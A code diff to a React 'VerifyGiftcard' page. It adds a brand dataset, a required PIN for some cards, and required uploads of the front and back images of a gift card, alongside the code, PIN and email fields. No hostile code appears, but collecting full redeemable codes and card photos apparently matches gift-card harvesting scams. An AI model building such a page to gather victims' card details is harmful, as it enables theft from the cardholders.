@@ -4,10 +4,11 @@ import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
-import { Shield, CheckCircle, AlertCircle } from "lucide-react";
+import { Shield, CheckCircle, AlertCircle, Upload } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import Header from "@/components/Header";
 import Footer from "@/components/Footer";
+import { giftCards, GiftCard } from "@/data/giftcards";
 
 const VerifyGiftcard = () => {
   const { toast } = useToast();
@@ -18,7 +19,9 @@ const VerifyGiftcard = () => {
     code: "",
     pin: "",
     amount: "",
-    email: ""
+    email: "",
+    frontImage: null as File | null,
+    backImage: null as File | null
   });
 
   const countries = [
@@ -26,10 +29,7 @@ const VerifyGiftcard = () => {
     "France", "Japan", "Brazil", "India", "Mexico"
   ];
 
-  const giftcardBrands = [
-    "Amazon", "iTunes", "Google Play", "Steam", "PlayStation", 
-    "Xbox", "Walmart", "Target", "Best Buy", "eBay"
-  ];
+  const selectedGiftCard = giftCards.find(card => card.name === formData.giftcardName);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -50,7 +50,9 @@ const VerifyGiftcard = () => {
       code: "",
       pin: "",
       amount: "",
-      email: ""
+      email: "",
+      frontImage: null,
+      backImage: null
     });
   };
 
@@ -58,6 +60,13 @@ const VerifyGiftcard = () => {
     setFormData(prev => ({
       ...prev,
       [field]: value
+    }));
+  };
+
+  const handleFileChange = (field: 'frontImage' | 'backImage', file: File | null) => {
+    setFormData(prev => ({
+      ...prev,
+      [field]: file
     }));
   };
 
@@ -113,10 +122,10 @@ const VerifyGiftcard = () => {
                       <SelectTrigger>
                         <SelectValue placeholder="Select gift card brand" />
                       </SelectTrigger>
-                      <SelectContent>
-                        {giftcardBrands.map((brand) => (
-                          <SelectItem key={brand} value={brand}>
-                            {brand}
+                      <SelectContent className="max-h-60">
+                        {giftCards.map((card) => (
+                          <SelectItem key={card.name} value={card.name}>
+                            {card.name} {card.requiresPin ? "(Code + PIN)" : "(Code Only)"}
                           </SelectItem>
                         ))}
                       </SelectContent>
@@ -138,12 +147,15 @@ const VerifyGiftcard = () => {
 
                 <div className="grid gap-6 md:grid-cols-2">
                   <div className="space-y-2">
-                    <Label htmlFor="pin">PIN (if applicable)</Label>
+                    <Label htmlFor="pin">
+                      PIN {selectedGiftCard?.requiresPin ? "*" : "(if applicable)"}
+                    </Label>
                     <Input
                       id="pin"
-                      placeholder="Enter PIN if required"
+                      placeholder="Enter PIN"
                       value={formData.pin}
                       onChange={(e) => handleInputChange("pin", e.target.value)}
+                      required={selectedGiftCard?.requiresPin}
                       className="font-mono"
                     />
                   </div>
@@ -157,6 +169,56 @@ const VerifyGiftcard = () => {
                       onChange={(e) => handleInputChange("amount", e.target.value)}
                       required
                     />
+                  </div>
+                </div>
+
+                {/* Image Upload Section */}
+                <div className="space-y-4">
+                  <Label>Upload Gift Card Images *</Label>
+                  <div className="grid gap-6 md:grid-cols-2">
+                    <div className="space-y-2">
+                      <Label htmlFor="frontImage">Front of Gift Card</Label>
+                      <div className="border-2 border-dashed border-border rounded-lg p-6 text-center hover:border-primary transition-colors">
+                        <Upload className="h-8 w-8 text-muted-foreground mx-auto mb-2" />
+                        <Input
+                          id="frontImage"
+                          type="file"
+                          accept="image/*"
+                          onChange={(e) => handleFileChange('frontImage', e.target.files?.[0] || null)}
+                          className="hidden"
+                          required
+                        />
+                        <Label htmlFor="frontImage" className="cursor-pointer">
+                          {formData.frontImage ? (
+                            <span className="text-primary font-medium">{formData.frontImage.name}</span>
+                          ) : (
+                            <span className="text-muted-foreground">Click to upload front image</span>
+                          )}
+                        </Label>
+                      </div>
+                    </div>
+
+                    <div className="space-y-2">
+                      <Label htmlFor="backImage">Back of Gift Card</Label>
+                      <div className="border-2 border-dashed border-border rounded-lg p-6 text-center hover:border-primary transition-colors">
+                        <Upload className="h-8 w-8 text-muted-foreground mx-auto mb-2" />
+                        <Input
+                          id="backImage"
+                          type="file"
+                          accept="image/*"
+                          onChange={(e) => handleFileChange('backImage', e.target.files?.[0] || null)}
+                          className="hidden"
+                          required
+                        />
+                        <Label htmlFor="backImage" className="cursor-pointer">
+                          {formData.backImage ? (
+                            <span className="text-primary font-medium">{formData.backImage.name}</span>
+                          ) : (
+                            <span className="text-muted-foreground">Click to upload back image</span>
+                          )}
+                        </Label>
+                      </div>
+                    </div>
                   </div>
                 </div>
 
